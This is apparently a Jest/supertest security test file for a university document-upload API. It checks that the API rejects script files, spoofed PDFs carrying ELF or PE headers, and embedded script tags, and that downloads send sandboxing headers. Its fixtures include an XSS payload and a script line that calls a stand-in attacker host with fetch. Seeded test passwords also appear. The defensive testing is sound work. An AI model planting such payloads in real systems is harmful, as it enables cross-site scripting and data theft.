import request from 'supertest';
import path from 'path';
import fs from 'fs';
import { createApp } from '../app';
import { seedDatabase } from '../db/seed';

const app = createApp();

let studentToken: string;
let adminToken: string;

beforeAll(async () => {
  seedDatabase();

  const studentLogin = await request(app)
    .post('/api/v1/auth/login')
    .send({ email: 'student.alex@iudwas.edu', password: 'Password@123' });
  studentToken = studentLogin.body.data.accessToken;

  const adminLogin = await request(app)
    .post('/api/v1/auth/login')
    .send({ email: 'admin@iudwas.edu', password: 'Password@123' });
  adminToken = adminLogin.body.data.accessToken;
});

describe('File Upload Security & Content Validation Tests', () => {
  describe('Extension Blacklist & Whitelist Validation', () => {
    it('should reject executable file extensions like .sh, .exe, .php, .js', async () => {
      const scriptPath = path.join(__dirname, 'exploit.sh');
      fs.writeFileSync(scriptPath, '#!/bin/bash\necho "exploit"');

      const res = await request(app)
        .post('/api/v1/documents/upload')
        .set('Authorization', `Bearer ${studentToken}`)
        .field('title', 'Exploit Shell Script')
        .attach('file', scriptPath);

      if (fs.existsSync(scriptPath)) fs.unlinkSync(scriptPath);

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('FILE_UPLOAD_ERROR');
      expect(res.body.error.message).toContain('Executable or script file type rejected');
    });

    it('should reject web script files like .html or .php', async () => {
      const htmlPath = path.join(__dirname, 'payload.html');
      fs.writeFileSync(htmlPath, '<script>alert(1)</script>');

      const res = await request(app)
        .post('/api/v1/documents/upload')
        .set('Authorization', `Bearer ${studentToken}`)
        .field('title', 'XSS Payload')
        .attach('file', htmlPath);

      if (fs.existsSync(htmlPath)) fs.unlinkSync(htmlPath);

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('FILE_UPLOAD_ERROR');
    });
  });

  describe('Deep Binary Magic-Byte Content Inspection', () => {
    it('should reject spoofed PDF containing Linux ELF binary header', async () => {
      const spoofedElfPath = path.join(__dirname, 'fake-elf.pdf');
      // 0x7F 'E' 'L' 'F' header
      const elfBuffer = Buffer.from([0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]);
      fs.writeFileSync(spoofedElfPath, elfBuffer);

      const res = await request(app)
        .post('/api/v1/documents/upload')
        .set('Authorization', `Bearer ${studentToken}`)
        .field('title', 'Spoofed ELF File')
        .attach('file', spoofedElfPath);

      if (fs.existsSync(spoofedElfPath)) fs.unlinkSync(spoofedElfPath);

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('INVALID_FILE_CONTENT');
      expect(res.body.error.message).toContain('Malicious binary executable detected');
    });

    it('should reject spoofed PDF containing DOS/Windows PE executable header', async () => {
      const spoofedPePath = path.join(__dirname, 'fake-pe.pdf');
      // 'MZ' (0x4D 0x5A) header
      const peBuffer = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      fs.writeFileSync(spoofedPePath, peBuffer);

      const res = await request(app)
        .post('/api/v1/documents/upload')
        .set('Authorization', `Bearer ${studentToken}`)
        .field('title', 'Spoofed Windows PE File')
        .attach('file', spoofedPePath);

      if (fs.existsSync(spoofedPePath)) fs.unlinkSync(spoofedPePath);

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('INVALID_FILE_CONTENT');
      expect(res.body.error.message).toContain('Malicious binary executable detected');
    });

    it('should reject spoofed PDF containing embedded script tags', async () => {
      const spoofedScriptPath = path.join(__dirname, 'fake-script.pdf');
      fs.writeFileSync(spoofedScriptPath, '<script>fetch("http://attacker.com")</script>');

      const res = await request(app)
        .post('/api/v1/documents/upload')
        .set('Authorization', `Bearer ${studentToken}`)
        .field('title', 'Spoofed Script File')
        .attach('file', spoofedScriptPath);

      if (fs.existsSync(spoofedScriptPath)) fs.unlinkSync(spoofedScriptPath);

      expect(res.status).toBe(400);
      expect(res.body.success).toBe(false);
      expect(res.body.error.code).toBe('INVALID_FILE_CONTENT');
    });

    it('should accept valid PNG image with proper 8-byte PNG header', async () => {
      const pngPath = path.join(__dirname, 'valid-image.png');
      // PNG header: 89 50 4E 47 0D 0A 1A 0A
      const pngBuffer = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00]);
      fs.writeFileSync(pngPath, pngBuffer);

      const res = await request(app)
        .post('/api/v1/documents/upload')
        .set('Authorization', `Bearer ${studentToken}`)
        .field('title', 'Valid Verified PNG')
        .attach('file', pngPath);

      if (fs.existsSync(pngPath)) fs.unlinkSync(pngPath);

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.file_type).toBe('image');
    });

    it('should accept valid JPEG image with proper FF D8 FF header', async () => {
      const jpgPath = path.join(__dirname, 'valid-photo.jpg');
      // JPEG header: FF D8 FF E0
      const jpgBuffer = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46]);
      fs.writeFileSync(jpgPath, jpgBuffer);

      const res = await request(app)
        .post('/api/v1/documents/upload')
        .set('Authorization', `Bearer ${studentToken}`)
        .field('title', 'Valid Verified Photo')
        .attach('file', jpgPath);

      if (fs.existsSync(jpgPath)) fs.unlinkSync(jpgPath);

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
    });
  });

  describe('Isolated Storage & Download Sandboxing Headers', () => {
    it('should reject unauthenticated direct access to static /uploads path', async () => {
      const res = await request(app)
        .get('/uploads/any-document.pdf');

      // Static serving was removed from web root; should return 404
      expect(res.status).toBe(404);
    });

    it('should return strict execution-prevention headers on authenticated document download', async () => {
      // Upload a test PDF first
      const pdfPath = path.join(__dirname, 'download-test.pdf');
      fs.writeFileSync(pdfPath, '%PDF-1.4 Sample Content for Security Header Verification');

      const uploadRes = await request(app)
        .post('/api/v1/documents/upload')
        .set('Authorization', `Bearer ${studentToken}`)
        .field('title', 'Security Headers Document')
        .attach('file', pdfPath);

      if (fs.existsSync(pdfPath)) fs.unlinkSync(pdfPath);

      const docId = uploadRes.body.data.document_id;

      const downloadRes = await request(app)
        .get(`/api/v1/documents/${docId}/download`)
        .set('Authorization', `Bearer ${studentToken}`);

      expect(downloadRes.status).toBe(200);
      expect(downloadRes.headers['content-disposition']).toContain('attachment');
      expect(downloadRes.headers['x-content-type-options']).toBe('nosniff');
      expect(downloadRes.headers['content-security-policy']).toBe("default-src 'none'; sandbox");
      expect(downloadRes.headers['cache-control']).toContain('no-store');
    });
  });
});
